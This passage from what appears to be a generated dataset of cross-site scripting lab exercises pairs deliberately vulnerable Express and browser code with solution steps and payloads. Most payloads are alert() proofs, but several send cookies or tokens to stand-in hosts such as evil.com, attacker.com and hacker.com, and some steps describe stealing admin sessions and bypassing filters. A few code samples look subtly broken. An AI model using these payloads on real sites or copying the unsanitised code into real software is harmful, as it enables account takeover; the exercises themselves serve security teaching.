      "Open DevTools and set localStorage.deviceLabel = '<img src=x onerror=alert(1)>'",
      "Reload the page and inspect how labels are inserted into the DOM.",
      "Observe execution of the payload on dashboard load.",
      "Modify payloads to exploit event-based triggers like onmouseover.",
      "Try using different tag wrappers to bypass rendering filters."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/dashboard', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='label'></div><script>document.getElementById('label').innerHTML = localStorage.deviceLabel;</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert(1)>",
      "<svg onload=alert('IoT')>"
    ]
  },
  {
    "Lab scenario": "Online invoice app Reflected XSS via PDF generation name field",
    "Lab Description": "The invoice generator embeds user input directly into an HTML-based invoice that is rendered then converted into a PDF. No sanitization is applied before rendering. To solve: Inject a script that executes during the preview phase of invoice generation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Submit invoice form with customer name: <script>alert('PDF')</script>",
      "Intercept request and preview the rendered invoice page.",
      "Observe script execution in the preview before PDF rendering.",
      "Try injecting into other fields like company or address.",
      "Check PDF output if script is embedded or executed."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/generate-invoice', (req, res) => {\n  const name = req.body.name;\n  res.send(`<!DOCTYPE html><html><body><div>Customer: ${name}</div></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('PDF')</script>",
      "<img src=x onerror=alert('Invoice')>"
    ]
  },
  {
    "Lab scenario": "Chat widget DOM-based XSS via dynamic welcome message",
    "Lab Description": "A customer support chat widget includes a dynamic welcome message based on the current user. This message is inserted using `innerHTML` from a URL query param. There's no sanitization, enabling DOM-based XSS. To solve: Craft a URL with a payload in the query parameter and trigger the widget.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit: /chat?user=<img src=x onerror=alert('Chat')>",
      "Confirm execution of the payload on widget render.",
      "Inspect how the script is added into the DOM.",
      "Try different encoded variants to evade basic filters.",
      "Ensure the payload executes without user interaction."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/chat', (req, res) => {\n  const name = req.query.user || 'Guest';\n  res.send(`<!DOCTYPE html><html><body><div id='welcome'></div><script>document.getElementById('welcome').innerHTML = `Hello, ${name}`;</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert('Chat')>",
      "<svg onload=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "CMS plugin Stored XSS in article tags",
    "Lab Description": "A content management system allows contributors to tag articles with arbitrary labels. These tags are rendered without sanitization on the article view page. To solve: Inject a script as a tag and verify it executes when the article is opened.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a contributor and navigate to 'Create Article'.",
      "Add a tag such as <script>alert('TagXSS')</script>.",
      "Save and publish the article.",
      "Open the article view page and observe execution.",
      "Try alternate injection methods via hidden iframes."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet tags = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-tag', (req, res) => {\n  tags.push(req.body.tag);\n  res.redirect('/article');\n});\n\napp.get('/article', (req, res) => {\n  const html = tags.map(t => `<span class='tag'>${t}</span>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('TagXSS')</script>",
      "<img src=1 onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "Blog engine Reflected XSS in 404 error message",
    "Lab Description": "The blog's custom 404 page reflects the requested URL path directly into the error page without encoding. This allows attackers to inject scripts into the error message display. To solve: Craft a malicious URL path that triggers script execution on error.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Visit a non-existent page like /<script>alert(404)</script>",
      "Observe if the script executes on the 404 error page.",
      "Use OWASP ZAP to replay the request with different payloads.",
      "Try encoded payloads to bypass filters.",
      "Validate execution across different browsers."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use((req, res) => {\n  res.status(404).send(`<!DOCTYPE html><html><body><h1>404 Not Found: ${req.url}</h1></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert(404)</script>",
      "<img src=x onerror=alert('404XSS')>"
    ]
  },
  {
    "Lab scenario": "Analytics dashboard DOM-based XSS via chart titles",
    "Lab Description": "The dashboard lets users create custom charts and label them with titles stored in `sessionStorage`. These are later rendered with innerHTML for display without validation. To solve: Inject a payload into `sessionStorage` and reload the page to trigger.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open DevTools console and run: sessionStorage.setItem('title', '<svg onload=alert(1)>')",
      "Reload the page and watch for execution.",
      "Analyze the script location and injection point in the DOM.",
      "Try nesting payloads in <style> or <marquee> for obfuscation.",
      "Ensure it triggers across sessions if persisted."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/chart', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><h1 id='chart-title'></h1><script>document.getElementById('chart-title').innerHTML = sessionStorage.getItem('title');</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<svg onload=alert(1)>",
      "<img src=x onerror=alert('ChartXSS')>"
    ]
  },
  {
    "Lab scenario": "Event registration app Mutation-based XSS in live form preview",
    "Lab Description": "The registration app provides a live preview of custom HTML invitations. The preview renderer mutates and appends the user's raw HTML input, enabling event-based script injection. To solve: Inject a script via onmouseover or onclick and observe execution in the preview.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Type <a href='#' onmouseover=alert('XSS')>Hover me</a> into the form field.",
      "Observe the preview update in real time with your content.",
      "Trigger the event by hovering over the rendered element.",
      "Try injecting <img> tags with onerror attributes.",
      "Check for script execution on mobile vs. desktop."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet preview = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview', (req, res) => {\n  preview = req.body.content;\n  res.redirect('/live-preview');\n});\n\napp.get('/live-preview', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='preview'>${preview}</div><script>const box = document.getElementById('preview'); const observer = new MutationObserver(() => {}); observer.observe(box, {childList: true});</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<a href='#' onmouseover=alert('XSS')>Hover me</a>",
      "<img src=x onerror=alert('PreviewXSS')>"
    ]
  },
  {
    "Lab scenario": "Job board Reflected XSS via email contact form",
    "Lab Description": "A job posting site includes a contact form that displays submitted data back to the user in a confirmation message. The name field is reflected into the DOM without escaping. To solve: Inject XSS payloads into the name input and submit the form.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Enter <script>alert('XSS')</script> in the name field.",
      "Submit the contact form.",
      "Observe the confirmation page with your payload reflected.",
      "Use Burp Suite to test for different input vector combinations.",
      "Try encoded payloads like %3Cscript%3E to bypass restrictions."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\napp.post('/contact', (req, res) => {\n  const name = req.body.name;\n  res.send(`<!DOCTYPE html><html><body><div>Thank you, ${name}, we will be in touch.</div></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<svg onload=alert('JobXSS')>"
    ]
  },
  {
    "Lab scenario": "Support ticket system Stored XSS in issue title",
    "Lab Description": "The support system allows users to submit tickets with custom titles. These titles are rendered on the admin dashboard without sanitization. To solve: Inject an XSS payload in the title field and trigger execution when viewed by an admin.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Login as a normal user and submit a new support ticket.",
      "In the 'Title' field, use: <script>alert('AdminXSS')</script>",
      "Log out and login as admin to review tickets.",
      "Observe the execution when the ticket title loads.",
      "Test obfuscated payloads to bypass WAF."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet tickets = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/submit-ticket', (req, res) => {\n  tickets.push(req.body.title);\n  res.redirect('/admin/tickets');\n});\n\napp.get('/admin/tickets', (req, res) => {\n  const html = tickets.map(t => `<div class='ticket-title'>${t}</div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('AdminXSS')</script>",
      "<img src=x onerror=alert('XSS')>"
    ]
  },
  {
    "Lab scenario": "IoT dashboard DOM-based XSS in log viewer",
    "Lab Description": "The IoT device dashboard pulls log messages from local storage and renders them using `innerHTML`. Malicious content injected into localStorage can lead to XSS. To solve: Store a malicious payload in localStorage and reload the logs view.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Open browser DevTools and set: localStorage.setItem('log', '<img src=x onerror=alert(1337)>');",
      "Refresh the logs view page.",
      "Check if the image payload gets executed.",
      "Try nesting payloads inside malformed HTML.",
      "Analyze browser console for CSP-related messages."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/logs', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='logs'></div><script>document.getElementById('logs').innerHTML = localStorage.getItem('log');</script></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<img src=x onerror=alert(1337)>",
      "<svg/onload=alert(1)>"
    ]
  },
  {
    "Lab scenario": "Online quiz app Reflected XSS in question preview",
    "Lab Description": "Instructors can preview custom questions by appending content to a preview URL. The question content is reflected into the HTML without escaping. To solve: Inject a payload into the question text parameter and confirm execution.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Access /preview?question=<script>alert('XSS')</script>",
      "Observe execution in the question preview page.",
      "Use Burp to test with URL-encoded payloads.",
      "Try payloads using SVG or iframes.",
      "Confirm if the payload is executed without authentication."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.get('/preview', (req, res) => {\n  const question = req.query.question || '';\n  res.send(`<!DOCTYPE html><html><body><div class='preview'>${question}</div></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<iframe src='javascript:alert(1)'></iframe>"
    ]
  },
  {
    "Lab scenario": "E-commerce product manager Stored XSS in custom attributes",
    "Lab Description": "Vendors can add custom HTML attributes to product cards, which are rendered in the admin dashboard. These attributes aren't sanitized, allowing script injection. To solve: Inject JavaScript into a custom attribute and trigger execution when viewed.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "As a vendor, go to 'Add Product'.",
      "Set a custom attribute like: onmouseover=alert('XSS')",
      "Save and open the admin dashboard.",
      "Hover over the affected product card.",
      "Try chaining multiple events for evasion."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet attributes = [];\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/add-attr', (req, res) => {\n  attributes.push(req.body.attr);\n  res.redirect('/dashboard');\n});\n\napp.get('/dashboard', (req, res) => {\n  const html = attributes.map(a => `<div class='product-card' ${a}></div>`).join('');\n  res.send(`<!DOCTYPE html><html><body>${html}</body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "onmouseover=alert('XSS')",
      "onerror=alert('AttrXSS')"
    ]
  },
  {
    "Lab scenario": "Marketing email preview Mutation-based XSS in dynamic editor",
    "Lab Description": "The dynamic email editor allows marketing staff to preview raw HTML email content. The content is rendered with `innerHTML`, allowing injected payloads to mutate the DOM. To solve: Inject a script via onerror or <svg> and observe execution in preview.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Insert <svg onload=alert('XSS')> in the HTML content.",
      "Click on 'Preview Email' and observe the output.",
      "Try different tags like <body onload=...>.",
      "Use the DevTools console to monitor mutations.",
      "Check if preview is persisted and accessible by others."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\nlet emailContent = '';\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/preview-email', (req, res) => {\n  emailContent = req.body.content;\n  res.redirect('/email');\n});\n\napp.get('/email', (req, res) => {\n  res.send(`<!DOCTYPE html><html><body><div id='email-preview'>${emailContent}</div></body></html>`);\n});\napp.listen(3000);",
    "payloads": [
      "<svg onload=alert('XSS')>",
      "<body onload=alert('PreviewXSS')>"
    ]
  },
  {
    "Lab scenario": "DOM XSS in WebSocket message handling",
    "Lab Description": "This lab contains a DOM-based cross-site scripting vulnerability in a WebSocket-based chat application. The application dynamically updates messages without proper sanitization, allowing attackers to inject malicious scripts. To solve: Inject an XSS payload via WebSocket and execute JavaScript in the victim's browser.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept WebSocket messages using Burp Suite.",
      "2. Inject the following payload: <img src=x onerror=alert(document.domain)>",
      "3. Observe the message rendering in the victim's chat window.",
      "4. Verify script execution in the victim's browser.",
      "5. Exfiltrate sensitive information using document.cookie."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst http = require('http');\nconst WebSocket = require('ws');\n\nconst app = express();\nconst server = http.createServer(app);\nconst wss = new WebSocket.Server({ server });\n\napp.use(express.static(__dirname + '/public'))\n\nwss.on('connection', ws => {\n  ws.on('message', message => {\n    wss.clients.forEach(client => {\n      if (client.readyState === WebSocket.OPEN) {\n        client.send(`<div class='message'>${message}</div>`);\n      }\n    });\n  });\n});\n\nserver.listen(8080, () => console.log('WebSocket server running on port 8080'));",
    "payloads": [
      "<img src=x onerror=alert(document.domain)>",
      "<script>alert('WebSocketXSS')</script>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in CMS user profile",
    "Lab Description": "This lab contains a stored cross-site scripting vulnerability in a CMS profile update feature. The application does not properly escape user input before rendering it on the dashboard. To solve: Inject a persistent XSS payload in the profile description and trigger script execution for other users.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register an account and navigate to the profile edit page.",
      "2. Inject the payload <script>fetch('http://evil.com?c='+document.cookie)</script> in the bio field.",
      "3. Save the profile and log out.",
      "4. Wait for an administrator to view the profile, triggering script execution.",
      "5. Capture administrator session cookies."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-profile', (req, res) => {\n  const bio = req.body.bio;\n  const formatted = `<p>${bio}</p>`;\n  db.query(\"UPDATE users SET bio = ? WHERE id = ?\", [formatted, req.user.id]);\n  res.redirect('/dashboard');\n});",
    "payloads": [
      "<script>fetch('http://evil.com?c='+document.cookie)</script>",
      "<img src=x onerror=alert('CMS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS via HTTP header manipulation",
    "Lab Description": "This lab contains a reflected XSS vulnerability in an HTTP response header. The application echoes back user-supplied data without encoding it properly. To solve: Inject a JavaScript payload in a request header and execute an alert().",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept a GET request using Burp Suite.",
      "2. Modify the User-Agent header to include: \"<script>alert('XSS')</script>\".",
      "3. Observe script execution in the server response.",
      "4. Identify additional injection points for privilege escalation.",
      "5. Bypass security filters using event-based XSS techniques."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/profile', (req, res) => {\n  const userAgent = req.headers['user-agent'];\n  res.setHeader('X-Debug-Info', userAgent);\n  res.send(`<html><body><h1>Welcome!</h1></body></html>`);\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('Header')>"
    ]
  },
  {
    "Lab scenario": "Mutation XSS via DOM property injection",
    "Lab Description": "This lab demonstrates a mutation-based XSS vulnerability. The application modifies DOM properties dynamically based on user input. To solve: Inject an XSS payload that mutates into an executable script after DOM manipulation.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Locate a dynamic element on the page using DevTools.",
      "2. Inject a payload like: \"javascript:alert(1)\" into an editable field.",
      "3. Observe how the application mutates input into an event handler.",
      "4. Confirm successful execution after mutation.",
      "5. Extend the attack to steal authentication tokens."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const input = document.querySelector('#user-input');\nconst preview = document.querySelector('#preview');\n\ninput.addEventListener('input', e => {\n  const val = e.target.value;\n  preview.innerHTML = `<a href='${val}'>Click</a>`;\n});",
    "payloads": [
      "javascript:alert(1)",
      "\" onmouseover=alert('XSS') x=\""
    ]
  },
  {
    "Lab scenario": "Stored XSS via SVG file upload",
    "Lab Description": "This lab contains a stored XSS vulnerability via an SVG file upload feature. The application fails to sanitize embedded JavaScript inside SVG images. To solve: Upload a malicious SVG file containing an XSS payload and trigger script execution when an administrator views it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Create a malicious SVG file containing <script>alert(1)</script>.",
      "2. Upload the file to the application using the file manager.",
      "3. Wait for an administrator to open the file.",
      "4. Observe JavaScript execution in their session.",
      "5. Exploit the vulnerability to steal session tokens."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst app = express();\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  const file = req.files.svg;\n  file.mv(`./uploads/${file.name}`, err => {\n    if (err) return res.status(500).send('Upload failed');\n    res.send('File uploaded successfully');\n  });\n});",
    "payloads": [
      "<svg><script>alert(1)</script></svg>",
      "<script>alert('SVGXSS')</script>"
    ]
  },
  {
    "Lab scenario": "DOM XSS via dynamically generated iframe src attribute",
    "Lab Description": "This lab contains a DOM-based XSS vulnerability in an iframe source attribute assignment. The application sets the iframe src dynamically based on user input without sanitization. To solve: Inject an XSS payload in the URL parameter to execute JavaScript inside the iframe.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Access the vulnerable endpoint with a crafted URL.",
      "2. Inject the payload: javascript:alert(document.domain)",
      "3. Observe the iframe loading the JavaScript payload.",
      "4. Extend the attack to exfiltrate sensitive data.",
      "5. Implement a bypass using encoded URI schemes."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/iframe', (req, res) => {\n  const page = req.query.page;\n  res.send(`<!DOCTYPE html><html><body><iframe id='iframe'></iframe><script>document.getElementById('iframe').src = \"${page}\";</script></body></html>`);\n});",
    "payloads": [
      "javascript:alert(document.domain)",
      "\" onload=alert('Iframe') x=\""
    ]
  },
  {
    "Lab scenario": "Stored XSS in comment section with Markdown processing",
    "Lab Description": "This lab contains a stored XSS vulnerability due to improper sanitization in a Markdown-based comment system. The application incorrectly allows JavaScript execution within user-submitted comments. To solve: Submit a crafted Markdown payload that executes JavaScript when rendered.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Register an account and navigate to the comment section.",
      "2. Post the payload: [Click me](javascript:alert(1))",
      "3. Reload the page and observe JavaScript execution.",
      "4. Exploit the vulnerability to steal authentication tokens.",
      "5. Implement a payload that persists across multiple views."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/comment', (req, res) => {\n  const comment = req.body.comment;\n  db.query('INSERT INTO comments (content) VALUES (?)', [comment]);\n  res.redirect('/post');\n});",
    "payloads": [
      "[Click me](javascript:alert(1))",
      "<script>alert('MDXSS')</script>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS via vulnerable JSON endpoint",
    "Lab Description": "This lab contains a reflected XSS vulnerability in a JSON API response. The application returns user input directly in the response without encoding. To solve: Inject an XSS payload in a query parameter and execute JavaScript when parsing the JSON response.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Send a request with an XSS payload via a query parameter.",
      "2. Inject: \"<script>alert(1)</script>\" into the 'name' parameter.",
      "3. Observe JavaScript execution in the browser console.",
      "4. Escalate the attack by chaining multiple payloads.",
      "5. Exfiltrate session cookies using an obfuscated payload."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/api/user', (req, res) => {\n  const name = req.query.name;\n  res.json({ message: `Hello, ${name}` });\n});",
    "payloads": [
      "<script>alert(1)</script>",
      "\" onload=alert('JSONXSS') x=\""
    ]
  },
  {
    "Lab scenario": "Mutation XSS via attribute-based event handler injection",
    "Lab Description": "This lab demonstrates a mutation-based XSS vulnerability where user input is inserted into an attribute, mutating into an event handler. The application improperly handles attribute-based user input, allowing execution of JavaScript. To solve: Inject an XSS payload that mutates and executes JavaScript after DOM modification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Identify a form input field that dynamically updates an element's attribute.",
      "2. Inject payload: \"onmouseover=alert(1)\" into the input field.",
      "3. Observe how the application mutates input into an event handler.",
      "4. Trigger the payload by interacting with the element.",
      "5. Bypass filters using encoded attribute payloads."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const userInput = req.query.hover || '';\nres.send(`<div title='${userInput}'>Hover here</div>`);",
    "payloads": [
      "onmouseover=alert(1)",
      "<svg onload=alert('AttributeXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS via JSON Web Token (JWT) payload",
    "Lab Description": "This lab contains a stored XSS vulnerability where an attacker can inject malicious JavaScript into a JWT payload. The application decodes and reflects the JWT payload in an admin dashboard without proper sanitization. To solve: Modify the JWT payload to include a stored XSS attack.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Capture and decode a JWT token using jwt.io.",
      "2. Modify the 'username' field to: \"<script>alert(1)</script>\".",
      "3. Re-sign the JWT using a weak secret key.",
      "4. Send the modified JWT to the application.",
      "5. Observe JavaScript execution in the admin dashboard."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const jwt = require('jsonwebtoken');\nconst express = require('express');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const decoded = jwt.verify(req.body.token, 'weaksecret');\n  res.send(`<h1>Welcome ${decoded.username}</h1>`);\n});",
    "payloads": [
      "<script>alert(1)</script>",
      "<img src=x onerror=alert('JWTXSS')>"
    ]
  },
  {
    "Lab scenario": "Stored XSS in user profile bio field",
    "Lab Description": "This lab contains a stored XSS vulnerability in the user profile bio field. The application allows users to enter bio descriptions, which are displayed on their profile pages without proper sanitization. To solve: Inject a malicious script that executes whenever another user views the profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Register a user account and navigate to the profile update section.",
      "2. Enter the payload <script>alert('XSS')</script> in the bio field.",
      "3. Save changes and log out.",
      "4. Log in as another user and visit the attacker’s profile.",
      "5. Observe the XSS execution."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst bodyParser = require('body-parser');\nconst app = express();\napp.use(bodyParser.urlencoded({ extended: true }));\n\napp.post('/update-bio', (req, res) => {\n  const bio = req.body.bio;\n  console.log('Updating bio with:', bio);\n  res.send(`<p>${bio}</p>`);\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('Profile')>"
    ]
  },
  {
    "Lab scenario": "DOM-based XSS in dynamic comment rendering",
    "Lab Description": "This lab contains a DOM-based XSS vulnerability in a comment rendering feature. The application updates comments dynamically in the DOM using innerHTML without proper sanitization. To solve: Inject JavaScript code that executes in another user's browser when they load comments.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Post a comment containing the payload: <img src=x onerror=alert('XSS')>",
      "2. Refresh the page and observe script execution.",
      "3. Test additional payloads for event-based execution.",
      "4. Verify if the attack works across multiple users.",
      "5. Develop a more sophisticated payload to exfiltrate session cookies."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/comments', (req, res) => {\n  const comment = req.query.comment || '';\n  console.log('Rendering comment:', comment);\n  res.send(`<div id='comments'><p>${comment}</p></div>`);\n});",
    "payloads": [
      "<img src=x onerror=alert('XSS')>",
      "<svg onload=alert('CommentXSS')>"
    ]
  },
  {
    "Lab scenario": "Mutation-based XSS via event handlers in chat application",
    "Lab Description": "This lab contains a mutation-based XSS vulnerability where user-generated content is manipulated by client-side scripts. The application modifies chat messages, allowing attackers to inject event-based malicious scripts. To solve: Exploit DOM mutation to inject an XSS payload.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Send a crafted message containing <a href='#' onclick='alert(1)'>Click me</a>.",
      "2. Observe how the message is processed by the application.",
      "3. Modify the payload to include additional event handlers like onmouseover.",
      "4. Trigger execution upon DOM modification.",
      "5. Verify persistence and payload execution on multiple users."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/chat', (req, res) => {\n  const msg = req.query.msg || '';\n  console.log('Received message:', msg);\n  res.send(`<div id='chatbox'><div>${msg}</div></div>`);\n});",
    "payloads": [
      "<a href='#' onclick='alert(1)'>Click me</a>",
      "<img src=x onerror=alert('ChatXSS')>"
    ]
  },
  {
    "Lab scenario": "Reflected XSS in search query results",
    "Lab Description": "This lab contains a reflected XSS vulnerability in the search functionality. The application dynamically displays user input without proper encoding. To solve: Craft a malicious search query that triggers JavaScript execution in the user's browser.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Enter <script>alert('XSS')</script> in the search bar.",
      "2. Click the search button.",
      "3. Observe script execution in the response.",
      "4. Experiment with different payloads for bypassing security mechanisms.",
      "5. Implement URL encoding techniques for deeper exploitation."
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/search', (req, res) => {\n  const query = req.query.q || '';\n  console.log('Search query:', query);\n  res.send(`<h2>Results for: ${query}</h2>`);\n});",
    "payloads": [
      "<script>alert('XSS')</script>",
      "<img src=x onerror=alert('Search')>"
    ]
  },
  {
    "Lab scenario": "XSS via WebSocket message injection",
    "Lab Description": "This lab contains an XSS vulnerability in a WebSocket-based messaging system. The application broadcasts user messages to all connected clients without validation. To solve: Inject a malicious payload into the WebSocket message stream to trigger execution.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Open the WebSocket connection and send malicious payload",
      "2. Observe execution in all connected clients",
      "3. Exploit cookie stealing"
    ],
    "payloads": [
      "<img src=x onerror='fetch(\"https://attacker.com?c=\"+document.cookie)'>",
      "<script>new Image().src='http://hacker.com/?leak='+btoa(document.cookie)</script>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const WebSocket = require('ws');\nconst wss = new WebSocket.Server({ port: 3000 });\n\nwss.on('connection', (ws) => {\n  ws.on('message', (data) => {\n    wss.clients.forEach(client => {\n      client.send(`<div>${data}</div>`); // Vulnerable code\n    });\n  });\n});"
  },
  {
    "Lab scenario": "Stored XSS in product review section",
    "Lab Description": "This lab contains a stored XSS vulnerability in the product review section. The application allows users to submit reviews, which are displayed on product pages without proper sanitization. To solve: Inject a malicious script that executes whenever another user views the product review.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Submit review with XSS payload",
      "2. Refresh page to trigger execution",
      "3. Exploit session hijacking"
    ],
    "payloads": [
      "<iframe src='javascript:alert(parent.document.cookie)'>",
      "<svg onload='fetch(\"https://evil.com/collect?data=\"+localStorage.getItem(\"token\"))'>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\napp.use(express.urlencoded({ extended: true }));\n\napp.post('/reviews', (req, res) => {\n  const review = req.body.content;\n  // Vulnerable database insertion\n  db.run(`INSERT INTO reviews VALUES ('${review}')`);\n  res.redirect('/product');\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "DOM-based XSS in real-time notifications",
    "Lab Description": "This lab contains a DOM-based XSS vulnerability in the real-time notifications feature. Notifications are inserted into the DOM dynamically using innerHTML without proper sanitization. To solve: Inject a script that executes when another user receives a notification.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Craft malicious notification message",
      "2. Trigger DOM manipulation",
      "3. Capture user credentials"
    ],
    "payloads": [
      "<img src='x' onerror='window.location=\"https://phishing.com?cookie=\"+document.cookie'>",
      "<video><source onerror='new Audio().src=\"http://attacker.com/\"+document.domain'>"
    ],
    "Vulnerability name": "Cross-site scripting",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/notify', (req, res) => {\n  const msg = req.query.alert;\n  res.send(`\n    <script>\n      // Vulnerable DOM manipulation\n      document.getElementById('alerts').innerHTML = \n        decodeURIComponent('${encodeURIComponent(msg)}');\n    </script>\n  `);\n});\n\napp.listen(3000);"
  },
  {
    "Lab scenario": "Reflected XSS in feedback form submission",
    "Lab Description": "This lab contains a reflected XSS vulnerability in the feedback submission form. The application includes user input in the response page without proper encoding. To solve: Inject a script that executes when the form submission result is displayed.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1. Submit feedback with XSS payload",
      "2. Direct victim to crafted URL",
      "3. Perform session fixation"
    ],
    "payloads": [
      "javascript:eval(atob('YWxlcnQoJ1hTUyB0cmlnZ2VyZWQhJyk='))",
      "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
    ],
    "Vulnerability name": "Cross-site scripting",
